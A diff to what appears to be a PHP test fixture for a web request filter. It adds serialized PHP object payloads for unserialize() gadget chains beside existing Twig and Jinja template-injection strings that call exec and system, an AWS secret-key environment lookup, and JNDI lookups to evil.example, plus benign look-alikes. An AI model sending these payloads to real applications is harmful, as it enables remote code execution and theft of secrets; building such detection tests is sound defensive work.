@@ -136,6 +136,10 @@ return [
             ['/?name={{_self.env.registerUndefinedFilterCallback(%22exec%22)}}', [], 'ATK-SSTI'],   // Twig
             ['/?q={{[%27id%27]|filter(%27system%27)}}', [], 'ATK-SSTI'],
             ['/?q={{%27%27.__class__.__mro__}}', [], 'ATK-SSTI'],                          // Jinja
+            ['/?d=O:8:%22stdClass%22:0:%7B%7D', [], 'ATK-PHP-OBJ'],                       // a serialised object: unserialize() gadget chains
+            ['/?d=O:%2B8:%22stdClass%22:0:%7B%7D', [], 'ATK-PHP-OBJ'],                    // the "+" PHP accepts too (sent as %2B: a bare + is a space)
+            ['/?d=a:1:%7Bi:0;O:24:%22GuzzleHttp\\Psr7\\FnStream%22:1:%7Bs:1:%22x%22;i:1;%7D%7D', [], 'ATK-PHP-OBJ'],   // inside an array, namespaced
+            ['/?d=C:11:%22ArrayObject%22:21:%7Bx:i:0;a:0:%7B%7D;m:a:0:%7B%7D%7D', [], 'ATK-PHP-OBJ'],   // a custom-serialised one
             ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
             ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
             ['/', ['HTTP_X_FORWARDED_FOR' => '${jndi:ldap://evil.example/x}'], 'ATK-JNDI'],
@@ -189,6 +193,8 @@ return [
             '/search?q=%7B%7B%20user.name%20%7D%7D', // a placeholder, nothing computed
             '/?q={{ title }} and {{ date }}',
             '/?q={{#each items}}',                   // Handlebars: no call, no *
+            '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
+            '/?t=10:30:00&o=1',                      // times, a parameter called o
             '/?q=information about cookies',         // not information_schema
             '/?q=load file into outfile tutorial',   // the words, no quote, no bracket
             '/?q=extract value from json',           // extractvalue( needed
